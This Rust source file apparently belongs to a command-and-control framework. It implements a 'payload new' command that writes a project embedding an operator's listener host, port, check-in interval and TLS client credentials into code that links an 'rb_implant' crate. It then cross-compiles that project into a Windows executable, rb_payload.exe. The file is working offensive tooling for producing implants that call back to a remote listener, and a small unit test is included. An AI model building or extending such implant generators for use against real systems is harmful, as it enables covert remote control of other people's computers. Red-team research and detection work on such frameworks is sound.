use crate::command::*;
use crate::message::{CommandOutput, CommandError, CommandResult};
use crate::pki::ImplantCredentials;
use clap::{Arg, ArgMatches, Command as ClapCommand};
use std::any::Any;
use std::error::Error;
use std::path::PathBuf;

// Configuration for payload generation
#[derive(Debug)]
pub struct PayloadConfig {
    pub host: String,
    pub port: u16,
    pub interval: u64,
}

pub struct PayloadCommand;

impl RbCommand for PayloadCommand {
    fn name(&self) -> &'static str {
        "payload"
    }

    fn command_type(&self) -> CommandType {
        CommandType::Server
    }

    fn description(&self) -> &'static str {
        "Generate and manage payloads"
    }

    fn parse_args(&self, command_line: &str) -> Result<Box<dyn Any>, clap::Error> {
        let cmd = ClapCommand::new("payload")
            .about("Generate and manage payloads")
            .subcommand(
                ClapCommand::new("new")
                    .about("Generate a new payload")
                    .arg(
                        Arg::new("lhost")
                            .long("lhost")
                            .help("Listener host (IP or hostname)")
                            .required(true),
                    )
                    .arg(
                        Arg::new("lport")
                            .long("lport")
                            .help("Listener port")
                            .default_value("8080"),
                    )
                    .arg(
                        Arg::new("interval")
                            .long("interval")
                            .help("Check-in interval in seconds")
                            .default_value("5"),
                    ),
            );

        // Split the command line into arguments
        let args: Vec<_> = command_line.split_whitespace().collect();
        
        // Parse the command line
        let matches = cmd.try_get_matches_from(args)?;
        
        // Return the matches
        Ok(Box::new(matches))
    }

    fn execute_with_parsed_args(
        &self,
        context: &mut CommandContext,
        args: Box<dyn Any>,
    ) -> CommandResult {
        let matches = match args.downcast::<ArgMatches>() {
            Ok(matches) => *matches,
            Err(_) => {
                return Err(CommandError::InvalidArguments("Failed to parse arguments".to_string()));
            }
        };

        // Handle subcommands
        if let Some(("new", sub_matches)) = matches.subcommand() {
            // Create a new payload
            let host = sub_matches.get_one::<String>("lhost").unwrap().clone();
            let port = sub_matches
                .get_one::<String>("lport")
                .unwrap()
                .parse::<u16>()
                .unwrap_or(8080);
            let interval = sub_matches
                .get_one::<String>("interval")
                .unwrap()
                .parse::<u64>()
                .unwrap_or(5);

            let config = PayloadConfig {
                host,
                port,
                interval,
            };

            // Generate the payload
            let creds = context.pki.implant_credentials();
            match self.generate_payload(config, &creds) {
                Ok((path, data)) => {
                    let name = path
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_else(|| "rb_payload.exe".to_string());
                    Ok(CommandOutput::File { name, data })
                }
                Err(e) => {
                    Err(CommandError::ExecutionFailed(format!("Failed to generate payload: {}", e)))
                }
            }
        } else {
            // Show help if no subcommand is specified
            let help = "Usage: payload new --lhost <ip> --lport <port> [--interval <seconds>]".to_string();
            Ok(CommandOutput::Text(help))
        }
    }
}

impl PayloadCommand {
    fn generate_payload(
        &self,
        config: PayloadConfig,
        creds: &ImplantCredentials,
    ) -> Result<(PathBuf, Vec<u8>), Box<dyn Error>> {
        use std::fs;
        use std::process::Command;

        let base = std::path::Path::new("rb_payload_build");
        self.write_project(base, &config, creds)?;

        // Build the project targeting Windows GNU
        println!("Building payload...");
        let output = Command::new("cargo")
            .current_dir(base)
            .args(["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .output()?;

        if !output.status.success() {
            return Err(format!(
                "Build failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )
            .into());
        }

        let exe_path = base.join("target/x86_64-pc-windows-gnu/release/rb_payload.exe");
        if !exe_path.exists() {
            return Err("Build completed but executable not found at expected path".into());
        }

        let data = fs::read(&exe_path)?;
        Ok((exe_path, data))
    }

    fn write_project(
        &self,
        base: &std::path::Path,
        config: &PayloadConfig,
        creds: &ImplantCredentials,
    ) -> Result<(), Box<dyn Error>> {
        use std::fs;

        fs::create_dir_all(base.join("src"))?;

        let manifest = r#"
[package]
name = "rb_payload"
version = "0.1.0"
edition = "2021"

[dependencies]
rb_implant = { path = "../rb_implant" }
tokio = { version = "1", features = ["full"] }
"#;
        fs::write(base.join("Cargo.toml"), manifest)?;

        // NOTE: the outer raw string uses `r##"..."##` because the generated code
        // contains inner raw strings written as `r#"..."#`.
        let main_rs = format!(
            r##"
use rb_implant::{{Args, TlsMaterial, run_implant_with_args}};

#[tokio::main]
async fn main() {{
    let tls_material = TlsMaterial {{
        ca_cert_pem: r#"{ca}"#.to_string(),
        client_cert_pem: r#"{cert}"#.to_string(),
        client_key_pem: r#"{key}"#.to_string(),
    }};

    let args = Args {{
        host: "{host}".to_string(),
        port: {port},
        interval: {interval},
        ca_path: String::new(),
        cert_path: String::new(),
        key_path: String::new(),
        tls_material: Some(tls_material),
    }};

    if let Err(e) = run_implant_with_args(args).await {{
        eprintln!("Fatal error: {{}}", e);
        std::process::exit(1);
    }}
}}
"##,
            ca = creds.ca_cert_pem,
            cert = creds.client_cert_pem,
            key = creds.client_key_pem,
            host = config.host,
            port = config.port,
            interval = config.interval,
        );
        fs::write(base.join("src/main.rs"), main_rs)?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn creds() -> ImplantCredentials {
        ImplantCredentials {
            ca_cert_pem: "-----BEGIN CERTIFICATE-----\nCA\n-----END CERTIFICATE-----\n".to_string(),
            client_cert_pem: "-----BEGIN CERTIFICATE-----\nCERT\n-----END CERTIFICATE-----\n"
                .to_string(),
            client_key_pem: "-----BEGIN PRIVATE KEY-----\nKEY\n-----END PRIVATE KEY-----\n"
                .to_string(),
        }
    }

    #[test]
    fn generated_main_embeds_credentials() {
        let dir = std::env::temp_dir().join(format!("rb_payload_{}", uuid::Uuid::new_v4()));
        let config = PayloadConfig {
            host: "10.0.0.5".to_string(),
            port: 8443,
            interval: 7,
        };

        PayloadCommand
            .write_project(&dir, &config, &creds())
            .unwrap();

        let main_rs = std::fs::read_to_string(dir.join("src/main.rs")).unwrap();
        assert!(main_rs.contains("10.0.0.5"));
        assert!(main_rs.contains("port: 8443"));
        assert!(main_rs.contains("-----BEGIN CERTIFICATE-----"));
        assert!(main_rs.contains("-----BEGIN PRIVATE KEY-----"));

        let _ = std::fs::remove_dir_all(&dir);
    }
}
